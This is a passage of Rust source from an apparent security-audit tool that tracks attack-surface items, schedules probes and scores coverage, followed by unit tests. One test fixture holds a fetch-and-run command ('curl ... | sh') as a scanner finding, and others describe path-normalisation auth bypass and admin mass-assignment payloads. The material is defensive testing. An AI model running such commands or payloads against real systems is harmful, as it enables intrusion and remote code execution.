                    "interesting_paths" | "registry_keys" => ("fs_path_io", 84u32),
                    "cmd_templates" => ("exec_spawn", 92u32),
                    _ => ("binary_surface", 84u32),
                };
                let arr = arr_v.as_array().map(Vec::as_slice).unwrap_or(&[]);
                for entry in arr.iter().take(8) {
                    let sval = entry["value"].as_str().unwrap_or("").trim();
                    if sval.is_empty() {
                        continue;
                    }
                    let enc = entry["encoding"].as_str().unwrap_or("ascii");
                    let off = entry["offset"].as_str().unwrap_or("");
                    let addr = entry["addr"].as_str().unwrap_or(off);
                    let tgt = format!("{bin_label}::{sval}");
                    let snip = format!("{sval} ({enc} {off})");
                    push_item(ItemDraft {
                        axis,
                        module: bin_label,
                        target: &tgt,
                        line: 0,
                        symbol: cat,
                        snippet: &snip,
                        guard_hint: addr,
                        score,
                    });
                }
            }
        }
        if let Some(buckets) = surf_inner
            .get("import_risk_buckets")
            .and_then(Value::as_object)
        {
            for (bucket, syms_v) in buckets.iter().take(6) {
                let syms: Vec<&str> = syms_v
                    .as_array()
                    .map(|a| a.iter().filter_map(Value::as_str).collect())
                    .unwrap_or_default();
                if syms.is_empty() {
                    continue;
                }
                let tgt = format!("{bin_label}::imports::{bucket}");
                let snip = syms.iter().take(8).copied().collect::<Vec<_>>().join(", ");
                push_item(ItemDraft {
                    axis: "binary_imports",
                    module: bin_label,
                    target: &tgt,
                    line: 0,
                    symbol: bucket,
                    snippet: &snip,
                    guard_hint: "import_risk",
                    score: 85,
                });
            }
        }
        return Ok(("binary_surface".to_string(), added, skipped, filtered));
    }

    if is_routes {
        let src_label = surf_inner
            .get("target")
            .or_else(|| val.get("target"))
            .and_then(Value::as_str)
            .unwrap_or("bundle")
            .trim();
        let kind = ingest_js_surface_obj(surf_inner, src_label, &mut push_item);
        return Ok((kind.to_string(), added, skipped, filtered));
    }

    let (a, s, f) = seed_from_json_str_with_excludes(state, raw, excludes)?;
    Ok(("frontier_items".to_string(), a, s, f))
}

pub struct FrontierSeedOpts<'a> {
    pub store: Option<&'a str>,
    pub from_json: Option<&'a str>,
    pub from_stdin: bool,
    pub axis: Option<&'a str>,
    pub target: Option<&'a str>,
    pub module: Option<&'a str>,
    pub note: Option<&'a str>,
    pub score: u32,
    pub excludes: &'a [String],
    pub as_json: bool,
}

pub fn run_frontier_seed(cwd: &Path, opts: &FrontierSeedOpts<'_>) -> i32 {
    let matcher = match FrontierExcludeMatcher::compile(opts.excludes) {
        Ok(m) => m,
        Err(e) => {
            emit_err(opts.as_json, &format!("[baton frontier] {e}"));
            return 2;
        }
    };
    let store_path = resolve_store_path(cwd, opts.store);
    let raw_input: Option<String> = if opts.from_stdin {
        let mut buf = String::new();
        if std::io::stdin().read_to_string(&mut buf).is_err() {
            emit_err(opts.as_json, "[baton frontier] failed to read stdin");
            return 1;
        }
        Some(buf)
    } else if let Some(path_str) = opts.from_json {
        match fs::read_to_string(path_str) {
            Ok(s) => Some(s),
            Err(e) => {
                emit_err(
                    opts.as_json,
                    &format!("[baton frontier] cannot read {path_str}: {e}"),
                );
                return 1;
            }
        }
    } else {
        None
    };

    let _lock = match acquire_file_lock(&store_path) {
        Ok(g) => g,
        Err(e) => {
            emit_err(opts.as_json, &format!("[baton frontier] lock failed: {e}"));
            return 1;
        }
    };
    let mut state = match load_frontier_strict(&store_path) {
        Ok(s) => s,
        Err(e) => {
            emit_err(opts.as_json, &format!("[baton frontier] {e}"));
            return 1;
        }
    };
    let (added, skipped, filtered) = if let Some(raw) = raw_input {
        match seed_from_json_str_with_excludes(&mut state, &raw, opts.excludes) {
            Ok(triple) => triple,
            Err(e) => {
                emit_err(opts.as_json, &format!("[baton frontier] {e}"));
                return 1;
            }
        }
    } else if let Some(tgt) = opts.target.map(str::trim).filter(|s| !s.is_empty()) {
        let ax = opts
            .axis
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .unwrap_or("general");
        let id = format!("{}:{}", ax, fnv1a_hex(&format!("{ax}|{tgt}")));
        let item = FrontierItem {
            id,
            axis: ax.to_string(),
            module: opts.module.unwrap_or("").trim().to_string(),
            target: tgt.to_string(),
            line: 0,
            symbol: String::new(),
            snippet: clip(opts.note.unwrap_or(""), 180),
            guard_hint: String::new(),
            score: opts.score,
            status: FrontierStatus::Unvisited,
            reason: String::new(),
            evidence_ref: String::new(),
            updated_at: now_iso_utc(),
        };
        if matcher.matches(&item) {
            (0, 0, 1)
        } else if upsert_item(&mut state, item) {
            (1, 0, 0)
        } else {
            (0, 1, 0)
        }
    } else {
        emit_err(
            opts.as_json,
            "[baton frontier] seed requires --from-json, --stdin, or --target",
        );
        return 2;
    };

    if let Err(e) = save_frontier_unlocked(&store_path, &mut state) {
        emit_err(opts.as_json, &format!("[baton frontier] save failed: {e}"));
        return 1;
    }
    if opts.as_json {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "ok": true,
                "added": added,
                "skipped_existing": skipped,
                "filtered_excluded": filtered,
                "total": state.items.len(),
                "store": store_path.to_string_lossy(),
            }))
            .unwrap_or_default()
        );
    } else {
        println!(
            "[baton frontier] seeded +{added} new ({skipped} existing kept, {filtered} excluded), total={}",
            state.items.len()
        );
    }
    0
}

pub fn run_frontier_mark(
    cwd: &Path,
    store: Option<&str>,
    query: &str,
    status_str: &str,
    reason: &str,
    evidence_ref: &str,
    as_json: bool,
) -> i32 {
    let Some(status) = FrontierStatus::parse(status_str) else {
        emit_err(
            as_json,
            &format!("[baton frontier] invalid status '{status_str}' (use unvisited|probed|stopped|confirmed|deferred)"),
        );
        return 2;
    };
    let store_path = resolve_store_path(cwd, store);
    let _lock = match acquire_file_lock(&store_path) {
        Ok(g) => g,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] lock failed: {e}"));
            return 1;
        }
    };
    let mut state = match load_frontier_strict(&store_path) {
        Ok(s) => s,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] {e}"));
            return 1;
        }
    };
    let q_low = query.trim().to_ascii_lowercase();
    let now = now_iso_utc();
    let mut updated_ids = Vec::new();
    for it in &mut state.items {
        let id_low = it.id.to_ascii_lowercase();
        let tgt_low = it.target.to_ascii_lowercase();
        if id_low == q_low
            || id_low.starts_with(&q_low)
            || (!q_low.is_empty() && q_low.len() >= 4 && tgt_low.contains(&q_low))
        {
            it.status = status.clone();
            if !reason.trim().is_empty() {
                it.reason = clip(reason, 180);
            }
            if !evidence_ref.trim().is_empty() {
                it.evidence_ref = clip(evidence_ref, 120);
            }
            it.updated_at = now.clone();
            updated_ids.push(it.id.clone());
        }
    }
    if updated_ids.is_empty() {
        if as_json {
            println!("{}", json!({"ok": false, "matched": 0, "query": query}));
        } else {
            println!("[baton frontier] no entry matched '{query}'");
        }
        return 1;
    }
    if let Err(e) = save_frontier_unlocked(&store_path, &mut state) {
        emit_err(as_json, &format!("[baton frontier] save failed: {e}"));
        return 1;
    }
    if as_json {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "ok": true,
                "status": status.as_str(),
                "matched": updated_ids.len(),
                "ids": updated_ids,
            }))
            .unwrap_or_default()
        );
    } else {
        println!(
            "[baton frontier] marked {} item(s) -> {} ({})",
            updated_ids.len(),
            status.as_str(),
            updated_ids.join(", ")
        );
    }
    0
}

pub fn run_frontier_next(
    cwd: &Path,
    store: Option<&str>,
    top_k: usize,
    exclude_axes: &[String],
    as_json: bool,
) -> i32 {
    let store_path = resolve_store_path(cwd, store);
    let state = match load_frontier_strict(&store_path) {
        Ok(s) => s,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] {e}"));
            return 1;
        }
    };
    let picked = pick_next_diverse(&state, top_k, exclude_axes);
    let summary = status_summary_json(&state, top_k);
    if as_json {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "ok": true,
                "total": state.items.len(),
                "unvisited": summary["unvisited"],
                "unexplored_axes": summary["unexplored_axes"],
                "explored_axes": summary["explored_axes"],
                "items": picked,
            }))
            .unwrap_or_default()
        );
    } else if picked.is_empty() {
        println!(
            "[baton frontier] no unvisited items remaining (total={}).",
            state.items.len()
        );
    } else {
        println!(
            "# NEXT DIVERSE FRONTIER ({} shown, {} unvisited total)",
            picked.len(),
            summary["unvisited"].as_u64().unwrap_or(0)
        );
        for it in picked {
            println!(
                "- `{}` [{}] `{}:{}` (`{}`) — {}",
                it.id,
                it.axis,
                it.target,
                it.line,
                it.symbol,
                clip(&it.snippet, 110)
            );
        }
    }
    0
}

pub fn run_frontier_status(cwd: &Path, store: Option<&str>, top_k: usize, as_json: bool) -> i32 {
    let store_path = resolve_store_path(cwd, store);
    let state = match load_frontier_strict(&store_path) {
        Ok(s) => s,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] {e}"));
            return 1;
        }
    };
    if as_json {
        println!(
            "{}",
            serde_json::to_string_pretty(&status_summary_json(&state, top_k)).unwrap_or_default()
        );
    } else {
        print!("{}", render_status_md(&state, top_k));
    }
    0
}

pub fn run_frontier_sync_stopped(
    cwd: &Path,
    store: Option<&str>,
    text_files: &[PathBuf],
    as_json: bool,
) -> i32 {
    let store_path = resolve_store_path(cwd, store);
    let mut loaded_texts = Vec::new();
    for tf in text_files {
        if let Ok(txt) = fs::read_to_string(tf) {
            let label = tf
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap_or("notes")
                .to_string();
            loaded_texts.push((label, txt));
        }
    }
    let _lock = match acquire_file_lock(&store_path) {
        Ok(g) => g,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] lock failed: {e}"));
            return 1;
        }
    };
    let mut state = match load_frontier_strict(&store_path) {
        Ok(s) => s,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] {e}"));
            return 1;
        }
    };
    let mut total_marked = 0usize;
    for (label, txt) in &loaded_texts {
        total_marked += sync_stopped_from_text(&mut state, label, txt);
    }
    if total_marked > 0 {
        if let Err(e) = save_frontier_unlocked(&store_path, &mut state) {
            emit_err(as_json, &format!("[baton frontier] save failed: {e}"));
            return 1;
        }
    }
    if as_json {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "ok": true,
                "newly_stopped": total_marked,
                "total": state.items.len(),
            }))
            .unwrap_or_default()
        );
    } else {
        println!("[baton frontier] synced {total_marked} already-covered item(s) as stopped.");
    }
    0
}

pub fn run_frontier_coverage(cwd: &Path, store: Option<&str>, top_k: usize, as_json: bool) -> i32 {
    let store_path = resolve_store_path(cwd, store);
    let state = match load_frontier_strict(&store_path) {
        Ok(s) => s,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] {e}"));
            return 1;
        }
    };
    let rep = compute_coverage_report(&state, top_k, &[]);
    if as_json {
        println!("{}", serde_json::to_string_pretty(&rep).unwrap_or_default());
    } else {
        print!("{}", render_coverage_md(&rep, false));
    }
    0
}

pub fn run_frontier_challenge(
    cwd: &Path,
    store: Option<&str>,
    top_k: usize,
    exclude_axes: &[String],
    as_json: bool,
) -> i32 {
    let store_path = resolve_store_path(cwd, store);
    let state = match load_frontier_strict(&store_path) {
        Ok(s) => s,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] {e}"));
            return 1;
        }
    };
    let rep = compute_coverage_report(&state, top_k, exclude_axes);
    if as_json {
        println!("{}", serde_json::to_string_pretty(&rep).unwrap_or_default());
    } else {
        print!("{}", render_coverage_md(&rep, true));
    }
    0
}

pub fn run_frontier_ingest(
    cwd: &Path,
    store: Option<&str>,
    from_file: Option<&str>,
    from_stdin: bool,
    kind_hint: Option<&str>,
    as_json: bool,
) -> i32 {
    run_frontier_ingest_with_excludes(cwd, store, from_file, from_stdin, kind_hint, &[], as_json)
}

#[allow(clippy::too_many_arguments)]
pub fn run_frontier_ingest_with_excludes(
    cwd: &Path,
    store: Option<&str>,
    from_file: Option<&str>,
    from_stdin: bool,
    kind_hint: Option<&str>,
    excludes: &[String],
    as_json: bool,
) -> i32 {
    if let Err(e) = validate_excludes(excludes) {
        emit_err(as_json, &format!("[baton frontier] {e}"));
        return 2;
    }
    let store_path = resolve_store_path(cwd, store);
    let raw = if from_stdin {
        let mut buf = String::new();
        if std::io::stdin().read_to_string(&mut buf).is_err() {
            emit_err(as_json, "[baton frontier] failed to read stdin");
            return 1;
        }
        buf
    } else if let Some(path_str) = from_file.map(str::trim).filter(|s| !s.is_empty()) {
        match fs::read_to_string(path_str) {
            Ok(s) => s,
            Err(e) => {
                emit_err(
                    as_json,
                    &format!("[baton frontier] cannot read {path_str}: {e}"),
                );
                return 1;
            }
        }
    } else {
        emit_err(
            as_json,
            "[baton frontier] ingest requires --from-file or --stdin",
        );
        return 2;
    };

    let _lock = match acquire_file_lock(&store_path) {
        Ok(g) => g,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] lock failed: {e}"));
            return 1;
        }
    };
    let mut state = match load_frontier_strict(&store_path) {
        Ok(s) => s,
        Err(e) => {
            emit_err(as_json, &format!("[baton frontier] {e}"));
            return 1;
        }
    };
    let (detected_kind, added, skipped, filtered) =
        match ingest_tool_json_str_with_excludes(&mut state, &raw, kind_hint, excludes) {
            Ok(res) => res,
            Err(e) => {
                emit_err(as_json, &format!("[baton frontier] {e}"));
                return 1;
            }
        };
    if let Err(e) = save_frontier_unlocked(&store_path, &mut state) {
        emit_err(as_json, &format!("[baton frontier] save failed: {e}"));
        return 1;
    }
    let cov = compute_coverage_report(&state, 5, &[]);
    if as_json {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "ok": true,
                "detected_kind": detected_kind,
                "added": added,
                "skipped_existing": skipped,
                "filtered_excluded": filtered,
                "total": state.items.len(),
                "store": store_path.to_string_lossy(),
                "coverage_summary": cov,
            }))
            .unwrap_or_default()
        );
    } else {
        println!(
            "[baton frontier] ingested {detected_kind}: +{added} new ({skipped} existing kept, {filtered} excluded), total={}, verdict={}",
            state.items.len(),
            cov["exhaustion_verdict"].as_str().unwrap_or("UNKNOWN"),
        );
    }
    0
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn diverse_scheduler_prioritizes_unexplored_axes() {
        let mut st = FrontierState::default();
        let sample = json!({
            "root": "/tmp/app",
            "items": [
                {"id": "exec_spawn:1", "axis": "exec_spawn", "module": "ext/a", "target": "ext/a/run.js", "line": 10, "symbol": "spawnSync", "snippet": "spawnSync(x)", "score": 95},
                {"id": "exec_spawn:2", "axis": "exec_spawn", "module": "ext/b", "target": "ext/b/run.js", "line": 20, "symbol": "execFile", "snippet": "execFile(y)", "score": 94},
                {"id": "net_listen_rpc:1", "axis": "net_listen_rpc", "module": "ls/java", "target": "ls/java/SbtServer.java", "line": 42, "symbol": "ServerSocket", "snippet": "new ServerSocket(0)", "score": 92},
                {"id": "fs_path_io:1", "axis": "fs_path_io", "module": "ls/java", "target": "ls/java/Reader.java", "line": 88, "symbol": "Files.newBufferedReader", "snippet": "Files.newBufferedReader(p)", "score": 82}
            ]
        });
        let (added, _) = seed_from_json_str(&mut st, &sample.to_string()).unwrap();
        assert_eq!(added, 4);
        // Mark exec_spawn:1 as stopped -> exec_spawn now has 1 explored, while net_listen_rpc & fs_path_io have 0!
        st.items[0].status = FrontierStatus::Stopped;
        let next = pick_next_diverse(&st, 2, &[]);
        assert_eq!(next.len(), 2);
        // Must surface unexplored axes FIRST, NOT exec_spawn:2 despite higher score!
        assert_eq!(next[0].axis, "net_listen_rpc");
        assert_eq!(next[1].axis, "fs_path_io");
    }

    #[test]
    fn sync_stopped_marks_exact_matches_only() {
        let mut st = FrontierState::default();
        let sample = json!({
            "items": [
                {"id": "exec_spawn:1", "axis": "exec_spawn", "module": "ext/wizard", "target": "ext/wizard/git_runner.js", "line": 10, "symbol": "spawnSync", "score": 90},
                {"id": "net_listen_rpc:1", "axis": "net_listen_rpc", "module": "ls/sbt", "target": "ls/sbt/SbtPort.java", "line": 42, "symbol": "ServerSocket", "score": 92}
            ]
        });
        seed_from_json_str(&mut st, &sample.to_string()).unwrap();
        let notes = "- ext/wizard/git_runner.js spawnSync git -v checked and verified safe\n";
        let n = sync_stopped_from_text(&mut st, "audit_notes.md", notes);
        assert_eq!(n, 1);
        assert_eq!(st.items[0].status, FrontierStatus::Stopped);
        assert_eq!(st.items[1].status, FrontierStatus::Unvisited);
    }

    #[test]
    fn coverage_detects_shallow_stops_and_false_exhaustion_pressure() {
        let mut st = FrontierState::default();
        let sample = json!({
            "items": [
                {"id": "exec_spawn:1", "axis": "exec_spawn", "target": "src/run.ts", "line": 12, "symbol": "execSync", "guard_hint": "UNGUARDED,PARAM_TAINTED", "score": 96},
                {"id": "web_api_route:1", "axis": "web_api_route", "target": "/api/admin/role", "line": 44, "symbol": "POST /api/admin/role", "score": 88},
                {"id": "ipc_pipe_proto:1", "axis": "ipc_pipe_proto", "target": "src/ipc.ts", "line": 80, "symbol": "ipcMain.on", "score": 85}
            ]
        });
        seed_from_json_str(&mut st, &sample.to_string()).unwrap();
        // Shallow refusal on web_api_route, backed guard proof on ipc_pipe_proto, unvisited UNGUARDED exec_spawn
        st.items[1].status = FrontierStatus::Stopped;
        st.items[1].reason = "returned 403 forbidden on GET".to_string();
        st.items[2].status = FrontierStatus::Stopped;
        st.items[2].reason =
            "L82: requireAdminToken guard verified with paired control".to_string();

        let rep = compute_coverage_report(&st, 5, &[]);
        assert_eq!(rep["exhaustion_verdict"], "FALSE_EXHAUSTION_HIGH_PRESSURE");
        assert!(rep["pressure_score"].as_u64().unwrap() >= 25);
        assert_eq!(rep["shallow_stopped"], 1);
        assert_eq!(rep["shallow_stopped_items"][0]["id"], "web_api_route:1");
        assert_eq!(
            rep["shallow_stopped_items"][0]["shallow_kind"],
            "shallow_refusal_without_guard_proof"
        );
        assert_eq!(
            rep["challenge_targets"][0]["challenge_kind"],
            "unexplored_axis_high_priority"
        );

        // Fix shallow stop with concrete proof and mark exec_spawn probed -> GENUINELY_SATURATED
        st.items[0].status = FrontierStatus::Probed;
        st.items[1].reason = "L48: authorizeAdmin acl check blocks non-admin caller".to_string();
        let sat = compute_coverage_report(&st, 5, &[]);
        assert_eq!(sat["exhaustion_verdict"], "GENUINELY_SATURATED");
        assert_eq!(sat["pressure_score"], 0);
        assert_eq!(sat["shallow_stopped"], 0);
    }

    #[test]
    fn ingest_auto_detects_variants_binary_surface_and_routes_diff() {
        let mut st = FrontierState::default();
        let variants_json = json!({
            "root": "/tmp/app",
            "target_sinks": ["execSync"],
            "siblings": [
                {"function": "badFn", "file": "src/a.ts", "sink": "execSync", "sink_line": 12, "guard_placement": "UNGUARDED", "arg_taint": "PARAM_TAINTED", "arg_preview": "req.cmd", "is_outlier": true},
                {"function": "constFn", "file": "src/a.ts", "sink": "execSync", "sink_line": 22, "guard_placement": "UNGUARDED", "arg_taint": "CONST_LITERAL", "arg_preview": "'uptime'", "is_outlier": false},
                {"function": "safeFn", "file": "src/a.ts", "sink": "execSync", "sink_line": 32, "guard_placement": "GUARD_BEFORE", "arg_taint": "PARAM_TAINTED", "is_outlier": false}
            ]
        });
        let (k1, a1, _) = ingest_tool_json_str(&mut st, &variants_json.to_string(), None).unwrap();
        assert_eq!(k1, "variants");
        assert_eq!(a1, 1);
        assert_eq!(st.items[0].axis, "exec_spawn");
        assert_eq!(st.items[0].score, 96);

        let bin_surface_json = json!({
            "ok": true,
            "target": "helper.exe",
            "import_risk_buckets": {"exec_process": ["CreateProcessW"]},
            "artifacts": {
                "named_pipes": [{"value": "\\\\.\\pipe\\ctrl_pipe", "encoding": "utf16le", "offset": "0x200", "addr": "rva=0x1200 (.rdata)"}]
            }
        });
        let (k2, a2, _) =
            ingest_tool_json_str(&mut st, &bin_surface_json.to_string(), None).unwrap();
        assert_eq!(k2, "binary_surface");
        assert_eq!(a2, 2);

        let routes_diff_json = json!({
            "ok": true,
            "target": "web_dist",
            "surface": {
                "routes": [{"method": "GET", "path": "/api/v1/old", "line": 1}],
                "diff": {
                    "new_routes": [{"method": "DELETE", "path": "/api/v2/admin/tenant/:id", "line": 42, "file": "dist/main.js"}],
                    "new_graphql": [{"kind": "mutation", "name": "RotateKey", "line": 50, "file": "dist/main.js"}],
                    "new_ws_sse": [],
                    "new_ipc_sinks": []
                }
            }
        });
        let (k3, a3, _) =
            ingest_tool_json_str(&mut st, &routes_diff_json.to_string(), None).unwrap();
        assert_eq!(k3, "routes_diff");
        assert_eq!(a3, 2);
        assert!(st
            .items
            .iter()
            .any(|x| x.guard_hint == "NEW_DIFF" && x.score == 95));
    }

    #[test]
    fn ingest_handles_archive_surface_and_race_flow_candidates() {
        let mut st = FrontierState::default();
        let archive_json = json!({
            "ok": true,
            "format": "archive-surface",
            "archive_kind": "asar",
            "target": "desktop/app.asar",
            "electron_security_flags": [
                {"kind": "nodeIntegration_enabled", "severity": "HIGH", "entry_path": "main.js", "line": 12, "snippet": "nodeIntegration: true"}
            ],
            "ipc_handlers": [
                {"entry_path": "main.js", "line": 18, "snippet": "ipcMain.handle('run', ...)"}
            ],
            "manifest_risks": [
                {"kind": "untrusted_workspaces_enabled", "severity": "MEDIUM", "entry_path": "package.json", "detail": "supported=true"}
            ],
            "native_bins": [
                {"path": "native/helper.node", "size": 1024, "unpacked": true}
            ],
            "js_surface": {
                "routes": [],
                "race_candidates": [
                    {"method": "POST", "path": "/api/v1/quota/redeem", "file": "main.js", "line": 22}
                ],
                "flow_candidates": [
                    {"stem": "/api/v1/orders", "steps": [{"method": "POST", "path": "/api/v1/orders"}, {"method": "GET", "path": "/api/v1/orders/:id"}]}
                ]
            }
        });
        let (kind, added, _) =
            ingest_tool_json_str(&mut st, &archive_json.to_string(), None).unwrap();
        assert_eq!(kind, "archive_surface");
        assert_eq!(added, 6);
        assert!(st
            .items
            .iter()
            .any(|x| x.axis == "webview_browser" && x.score == 95));
        assert!(st
            .items
            .iter()
            .any(|x| x.axis == "race_toctou" && x.guard_hint == "RACE_CANDIDATE"));
        assert!(st
            .items
            .iter()
            .any(|x| x.axis == "stateful_flow" && x.guard_hint == "FLOW_CANDIDATE"));
    }

    #[test]
    fn ingest_handles_http_mutate_matrix_and_ai_surface() {
        let mut st = FrontierState::default();
        let mut_json = json!({
            "ok": true,
            "mode": "http_mutate_matrix",
            "target": "https://api.example/v1/admin/users",
            "baseline_status": 403,
            "volatile_keys": ["request_id", "ts"],
            "variants_run": 12,
            "suppressed_count": 10,
            "anomaly_count": 2,
            "anomalies": [
                {
                    "class": "path_norm",
                    "label": "path:dot_segment",
                    "method": "GET",
                    "url": "https://api.example/v1/admin/./users",
                    "status": 200,
                    "kind": "AUTH_OR_ROUTE_BYPASS",
                    "detail": "Baseline HTTP 403 flipped to HTTP 200 under `path:dot_segment`",
                    "added_paths": ["users"],
                    "changed_paths": [],
                    "sentinel_hits": [],
                    "body_preview": "{\"ok\":true}"
                },
                {
                    "class": "mass_assign",
                    "label": "mass_assign:role_admin",
                    "method": "POST",
                    "url": "https://api.example/v1/users",
                    "status": 200,
                    "kind": "PARSER_DESYNC_ECHO",
                    "detail": "Response accepted/echoed injected admin mass-assignment keys",
                    "added_paths": ["role"],
                    "changed_paths": [],
                    "sentinel_hits": [],
                    "body_preview": "{\"role\":\"admin\"}"
                }
            ]
        });
        let (k1, a1, _) = ingest_tool_json_str(&mut st, &mut_json.to_string(), None).unwrap();
        assert_eq!(k1, "http_mutate_matrix");
        assert_eq!(a1, 2);
        assert!(st.items.iter().any(|x| x.axis == "web_parser_desync"
            && x.guard_hint == "AUTH_OR_ROUTE_BYPASS"
            && x.score == 96));
        assert!(st
            .items
            .iter()
            .any(|x| x.axis == "web_parser_desync" && x.guard_hint == "PARSER_DESYNC_ECHO"));

        let ai_json = json!({
            "ok": true,
            "clean": false,
            "mode": "ai_surface",
            "root": ".",
            "scanned_files": 4,
            "elapsed_ms": 1,
            "counts_by_category": {
                "MCP_CONFIG_EXEC": 1,
                "IDE_WORKSPACE_TRUST_BYPASS": 1
            },
            "findings": [
                {
                    "id": "MCP_CONFIG_EXEC:00000001",
                    "category": "MCP_CONFIG_EXEC",
                    "severity": "HIGH",
                    "file": ".mcp.json",
                    "line": 3,
                    "symbol": "mcp:bad",
                    "guard_hint": "MCP_SHELL_EXEC",
                    "snippet": "sh -c curl https://example.invalid/x.sh | sh",
                    "remediation": "Pin binary"
                },
                {
                    "id": "IDE_WORKSPACE_TRUST_BYPASS:00000002",
                    "category": "IDE_WORKSPACE_TRUST_BYPASS",
                    "severity": "MEDIUM",
                    "file": "package.json",
                    "line": 8,
                    "symbol": "untrustedWorkspaces",
                    "guard_hint": "IDE_UNTRUSTED_WORKSPACE",
                    "snippet": "\"untrustedWorkspaces\":{\"supported\":true}",
                    "remediation": "Restrict untrusted workspaces"
                }
            ]
        });
        let (k2, a2, _) = ingest_tool_json_str(&mut st, &ai_json.to_string(), None).unwrap();
        assert_eq!(k2, "ai_surface");
        assert_eq!(a2, 2);
        assert!(st.items.iter().any(|x| x.axis == "ai_agent_mcp"
            && x.guard_hint == "MCP_SHELL_EXEC"
            && x.score == 95));
        assert!(st.items.iter().any(|x| x.axis == "loader_plugin_ext"
            && x.guard_hint == "IDE_UNTRUSTED_WORKSPACE"
            && x.score == 90));
    }

    #[test]
    fn sync_stopped_ignores_contrast_blocks_and_generic_tokens_and_upsert_refreshes() {
        let mut st = FrontierState::default();
        let sample = json!({
            "items": [
                {"id": "web_api:1", "axis": "web_api_route", "module": "src/auth", "target": "src/auth/jwt_guard.ts", "line": 40, "symbol": "verifyJwtAdmin", "score": 88},
                {"id": "ipc_pipe:1", "axis": "ipc_pipe_proto", "module": "src/rpc", "target": "server.js", "line": 12, "symbol": "handle", "score": 85},
                {"id": "exec_spawn:1", "axis": "exec_spawn", "module": "pkg/worker", "target": "pkg/worker/runner.ts", "line": 18, "symbol": "dispatchWorkerJob", "score": 90}
            ]
        });
        seed_from_json_str(&mut st, &sample.to_string()).unwrap();

        let noisy_and_contrast = "\
            Differentiate: not duplicate of src/auth/jwt_guard.ts verifyJwtAdmin\n\
            ## 去重核对\n\
            \n\
            - src/auth/jwt_guard.ts verifyJwtAdmin checked earlier\n\
            \n\
            ## Findings\n\
            server.js handle admin token auth route port http listen params\n\
            pkg/worker/runner.ts dispatchWorkerJob verified clean\n";
        let stopped = sync_stopped_from_text(&mut st, "notes.md", noisy_and_contrast);
        assert_eq!(stopped, 1);
        assert_eq!(st.items[0].status, FrontierStatus::Unvisited);
        assert_eq!(st.items[1].status, FrontierStatus::Unvisited);
        assert_eq!(st.items[2].status, FrontierStatus::Stopped);

        // upsert_item refreshes metadata (line/score/guard_hint) while preserving Stopped status
        let refreshed = json!({
            "items": [
                {"id": "web_api:1", "axis": "web_api_route", "module": "src/auth", "target": "src/auth/jwt_guard.ts", "line": 52, "symbol": "verifyJwtAdmin", "guard_hint": "UNGUARDED", "score": 96},
                {"id": "exec_spawn:1", "axis": "exec_spawn", "module": "pkg/worker", "target": "pkg/worker/runner.ts", "line": 24, "symbol": "dispatchWorkerJob", "guard_hint": "PARAM_TAINTED", "score": 95}
            ]
        });
        seed_from_json_str(&mut st, &refreshed.to_string()).unwrap();
        assert_eq!(st.items[0].line, 52);
        assert_eq!(st.items[0].score, 96);
        assert_eq!(st.items[0].guard_hint, "UNGUARDED");
        assert_eq!(st.items[2].status, FrontierStatus::Stopped);
        assert_eq!(st.items[2].line, 24);
        assert_eq!(st.items[2].score, 95);

        let td = std::env::temp_dir().join(format!("ap_frontier_save_{}", std::process::id()));
        let _ = fs::remove_dir_all(&td);
        let fp = td.join("frontier.json");
        save_frontier(&fp, &mut st).unwrap();
        save_frontier(&fp, &mut st).unwrap();
        assert!(fp.is_file());
        let _ = fs::remove_dir_all(&td);
    }

    #[test]
    fn save_frontier_concurrent_threads_zero_enoent_or_corruption() {
        let td = std::env::temp_dir().join(format!(
            "ap_frontier_conc_{}_{}",
            std::process::id(),
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        ));
        let _ = fs::remove_dir_all(&td);
        let fp = td.join("frontier.json");

        let mut init_state = FrontierState::default();
        init_state.items.push(FrontierItem {
            id: "seed:1".to_string(),
            axis: "web_api_route".to_string(),
            module: "src".to_string(),
            target: "src/app.ts".to_string(),
            line: 10,
            symbol: "init".to_string(),
            snippet: String::new(),
            guard_hint: String::new(),
            score: 80,
            status: FrontierStatus::Unvisited,
            reason: String::new(),
            evidence_ref: String::new(),
            updated_at: String::new(),
        });
        save_frontier(&fp, &mut init_state).unwrap();

        let barrier = std::sync::Arc::new(std::sync::Barrier::new(8));
        std::thread::scope(|s| {
            for wid in 0..8usize {
                let fp_ref = &fp;
                let bar = std::sync::Arc::clone(&barrier);
                s.spawn(move || {
                    bar.wait();
                    for round in 0..10usize {
                        let mut st = FrontierState::default();
                        st.items.push(FrontierItem {
                            id: format!("w{wid}:r{round}"),
                            axis: "exec_spawn".to_string(),
                            module: "src".to_string(),
                            target: format!("src/f{wid}.rs"),
                            line: round + 1,
                            symbol: "run".to_string(),
                            snippet: String::new(),
                            guard_hint: String::new(),
                            score: 90,
                            status: FrontierStatus::Probed,
                            reason: "concurrent test".to_string(),
                            evidence_ref: String::new(),
                            updated_at: String::new(),
                        });
                        save_frontier(fp_ref, &mut st).expect("atomic save must not fail");
                        // Concurrent reader must ALWAYS observe the file on disk & valid JSON
                        assert!(fp_ref.is_file(), "frontier.json disappeared during replace");
                        let raw = fs::read_to_string(fp_ref).expect("readable during atomic swap");
                        let parsed: FrontierState =
                            serde_json::from_str(&raw).expect("valid JSON during atomic swap");
                        assert!(!parsed.items.is_empty());
                    }
                });
            }
        });
        assert!(!fp.with_extension("json.lock").exists(), "lock leaked");
        let _ = fs::remove_dir_all(&td);
    }

    #[test]
    fn seed_and_ingest_excludes_and_concurrent_locked_rmw() {
        let td = std::env::temp_dir().join(format!(
